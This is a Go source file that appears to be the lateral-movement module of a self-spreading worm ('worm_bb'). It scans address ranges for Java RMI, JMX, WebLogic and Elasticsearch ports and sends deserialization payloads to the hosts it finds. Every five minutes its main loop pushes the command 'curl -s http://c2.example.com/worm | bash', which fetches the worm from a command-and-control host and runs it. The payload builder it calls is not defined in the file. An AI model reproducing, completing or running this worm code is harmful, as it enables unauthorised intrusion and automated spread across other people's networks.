// worm_bb/jvm_lateral/module.go
// JVM Lateral Movement Module for worm_bb.
// Scans for Java services, delivers deserialization payloads.

package jvm_lateral

import (
	"encoding/json"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ========== SCANNER ==========

type JVMService struct {
	IP        string
	Port      int
	Type      string // "rmi", "jmx", "jmxmp", "weblogic", "tomcat", "elasticsearch"
	Banner    string
	Vulnerable bool
}

type JVMScanner struct {
	timeout     time.Duration
	concurrency int
	results     []JVMService
	mu          sync.Mutex
}

func NewJVMScanner() *JVMScanner {
	return &JVMScanner{
		timeout:     3 * time.Second,
		concurrency: 50,
	}
}

var DefaultJVMPorts = []int{
	1099, 9010, 1616, 8686, 7001, 4848,
	8080, 8009, 8443, 9990, 9999, 9200, 9300,
}

func (s *JVMScanner) ScanTargets(targets []string) []JVMService {
	s.results = nil
	type job struct{ ip string; port int }
	jobs := make(chan job, 500)
	var wg sync.WaitGroup

	for i := 0; i < s.concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				if svc := s.scanPort(j.ip, j.port); svc != nil {
					s.mu.Lock()
					s.results = append(s.results, *svc)
					s.mu.Unlock()
				}
			}
		}()
	}

	for _, target := range targets {
		if strings.Contains(target, ":") {
			parts := strings.Split(target, ":")
			port, _ := strconv.Atoi(parts[1])
			jobs <- job{ip: parts[0], port: port}
		} else if strings.Contains(target, "/") {
			for _, ip := range cidrHosts(target) {
				for _, p := range DefaultJVMPorts {
					jobs <- job{ip: ip, port: p}
				}
			}
		} else {
			for _, p := range DefaultJVMPorts {
				jobs <- job{ip: target, port: p}
			}
		}
	}
	close(jobs)
	wg.Wait()
	return s.results
}

func (s *JVMScanner) scanPort(ip string, port int) *JVMService {
	addr := net.JoinHostPort(ip, strconv.Itoa(port))
	conn, err := net.DialTimeout("tcp", addr, s.timeout)
	if err != nil {
		return nil
	}
	defer conn.Close()

	banner := make([]byte, 256)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, _ := conn.Read(banner)
	bannerStr := string(banner[:n])

	svc := &JVMService{IP: ip, Port: port, Banner: sanitize(bannerStr)}

	switch {
	case port == 1099 || port == 5555 || port == 4444:
		svc.Type, svc.Vulnerable = "rmi", true
	case port == 9010 || port == 1616 || port == 8686 || port == 9999:
		svc.Type, svc.Vulnerable = "jmx", true
	case port == 7001:
		svc.Type, svc.Vulnerable = "weblogic", true
	case port == 9200 || port == 9300:
		svc.Type, svc.Vulnerable = "elasticsearch", true
	default:
		if strings.Contains(bannerStr, "JRMI") || strings.Contains(bannerStr, "RMI") {
			svc.Type, svc.Vulnerable = "rmi", true
		} else {
			svc.Type = "unknown"
		}
	}
	return svc
}

// ========== ATTACKER ==========

type AttackResult struct {
	Target    string `json:"target"`
	Gadget    string `json:"gadget"`
	Success   bool   `json:"success"`
	Output    string `json:"output"`
	PayloadLen int   `json:"payload_len"`
}

func AttackService(svc JVMService, technique string, command string) *AttackResult {
	payload := BuildSubMapPayload(command)
	addr := net.JoinHostPort(svc.IP, strconv.Itoa(svc.Port))

	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return &AttackResult{
			Target: addr, Gadget: technique,
			Success: false, Output: fmt.Sprintf("connect: %s", err),
		}
	}
	defer conn.Close()

	n, err := conn.Write(payload)
	if err != nil {
		return &AttackResult{
			Target: addr, Gadget: technique,
			Success: false, Output: fmt.Sprintf("send: %s", err),
		}
	}

	return &AttackResult{
		Target:     addr,
		Gadget:     technique,
		Success:    true,
		Output:     fmt.Sprintf("delivered %d bytes via %s", n, svc.Type),
		PayloadLen: n,
	}
}

// ========== MODULE ==========

type Module struct {
	scanner *JVMScanner
	active  bool
	mu      sync.Mutex
}

func NewModule() *Module {
	return &Module{scanner: NewJVMScanner(), active: true}
}

func (m *Module) Start(networks []string) {
	fmt.Println("[JVM] JVM Lateral Movement module online")
	fmt.Println("[JVM] Scanning for Java services on", strings.Join(networks, ", "))
	go func() {
		for m.active {
			res := m.scanner.ScanTargets(networks)
			if len(res) > 0 {
				fmt.Printf("[JVM] Found %d Java services\n", len(res))
				for _, svc := range res {
					if !svc.Vulnerable {
						continue
					}
					fmt.Printf("[JVM] Attacking %s:%d (%s)\n", svc.IP, svc.Port, svc.Type)
					r := AttackService(svc, "submap",
						fmt.Sprintf("curl -s http://c2.example.com/worm | bash"))
					if r.Success {
						fmt.Printf("[JVM] ✓ %s\n", r.Output)
					}
				}
			}
			time.Sleep(5 * time.Minute)
		}
	}()
}

func (m *Module) Stop()           { m.active = false }
func (m *Module) IsActive() bool  { return m.active }
func (m *Module) Name() string    { return "jvm_lateral" }

func (m *Module) Status() string {
	info := map[string]interface{}{
		"module": "jvm_lateral",
		"active": m.active,
		"chains": []map[string]interface{}{
			{"name": "SubMap.readResolve", "auto_fire": true, "jdk": "8-11"},
			{"name": "TemplatesImpl.newTransformer", "auto_fire": false, "jdk": "8-11"},
		},
	}
	b, _ := json.Marshal(info)
	return string(b)
}

// ==== UTILITIES ====

func cidrHosts(cidr string) []string {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil
	}
	var ips []string
	ip := make(net.IP, len(ipnet.IP))
	copy(ip, ipnet.IP)
	for ; ipnet.Contains(ip); incIP(ip) {
		ips = append(ips, ip.String())
	}
	if len(ips) > 1024 {
		ips = ips[:1024] // limit scan breadth
	}
	return ips
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func sanitize(s string) string {
	var out []rune
	for _, r := range s {
		if r >= 32 && r <= 126 {
			out = append(out, r)
		}
		if len(out) >= 100 {
			break
		}
	}
	return string(out)
}
